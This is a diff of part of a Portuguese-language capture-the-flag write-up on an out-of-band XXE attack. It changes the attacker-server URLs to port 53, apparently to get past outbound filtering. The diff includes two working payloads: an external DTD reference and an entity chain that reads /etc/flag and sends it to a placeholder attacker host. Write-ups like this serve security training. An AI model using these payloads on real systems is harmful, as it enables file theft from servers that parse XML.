@@ -857,7 +857,7 @@ O único problema é que o servidor do chall não permitia nenhuma conexão exte
 Feito isso, enviou-se o payload através do textarea (dando submit):
 ``` xml
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data SYSTEM "http://<my-server-ip>/host.dtd">
+<!DOCTYPE data SYSTEM "http://<my-server-ip>:53/host.dtd">
 <data>&send;</data>
 ```
 *Payload I* - Enviado via campo content no POST do index.php
@@ -865,12 +865,12 @@ Feito isso, enviou-se o payload através do textarea (dando submit):
 Ao carregar o XML no servidor do desafio, ele busca no nosso servidor local esse outro payload:
 ```
 <!ENTITY % file SYSTEM "file:///etc/flag">
-<!ENTITY % eval "<!ENTITY send SYSTEM 'http://<my-server-ip>/collect/%file;'>">
+<!ENTITY % eval "<!ENTITY send SYSTEM 'http://<my-server-ip>:53/collect/%file;'>">
 %eval;
 ```
 *Payload II* - Mantido no servidor local para ser requisitado pelo servidor do chall via XXE pelo primeiro payload
 
-Ao realizar a requisição GET *http://<my-server-ip>/collect/%file;*, é enviado o %file;, que contém a flag, para o nosso servidor local.
+Ao realizar a requisição GET *http://<my-server-ip>:53/collect/%file;*, é enviado o %file;, que contém a flag, para o nosso servidor local.
 
 
 
